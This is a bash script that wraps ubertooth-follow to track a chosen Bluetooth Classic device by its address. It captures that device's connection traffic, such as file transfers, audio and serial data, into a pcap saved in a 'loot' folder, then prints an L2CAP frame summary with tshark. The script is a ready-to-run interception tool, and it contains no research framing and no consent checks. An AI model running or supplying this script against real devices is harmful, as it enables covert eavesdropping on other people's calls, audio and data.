#!/usr/bin/env bash
# ==================================================================
#  ubertooth-bredr-sniff.sh
#  Description : Bluetooth Classic BR/EDR connection following using
#                Ubertooth One. Follows a target device's baseband
#                and attempts to capture connection content (OBEX,
#                A2DP, HFP, SPP depending on profile).
#  Requires    : ubertooth-follow, ubertooth-rx (or wireshark btsnoop)
#  Usage       : ./ubertooth-bredr-sniff.sh <target_bd_addr>
#  Example     : ./ubertooth-bredr-sniff.sh 11:22:33:AA:BB:CC
# ==================================================================

set -euo pipefail
TARGET="${1:?Usage: $0 <target_bd_addr>}"
LOOT_DIR="./loot/bredr-sniff-$(date +%Y%m%d_%H%M%S)"; mkdir -p "$LOOT_DIR"
PCAP="${LOOT_DIR}/bredr_${TARGET//:/_}.pcap"

echo " =================================================="
echo "  Ubertooth One — Bluetooth BR/EDR Follow"
echo "  Target: $TARGET"
echo " =================================================="
echo "[*] Press Ctrl+C to stop"

ubertooth-follow -t "$TARGET" -c "$PCAP" 2>/dev/null &
UBERTOOTH_PID=$!

cleanup() {
    kill "$UBERTOOTH_PID" 2>/dev/null || true
    echo ""
    echo "[+] PCAP: $PCAP ($(du -sh "$PCAP" 2>/dev/null | cut -f1 || echo 0))"
    if command -v tshark >/dev/null 2>&1 && [ -f "$PCAP" ]; then
        echo "[*] L2CAP summary:"
        tshark -r "$PCAP" -Y "btl2cap" -T fields \
            -e frame.number -e btl2cap.cid -e btl2cap.length 2>/dev/null | head -20 || true
    fi
}
trap cleanup EXIT INT TERM

wait "$UBERTOOTH_PID"
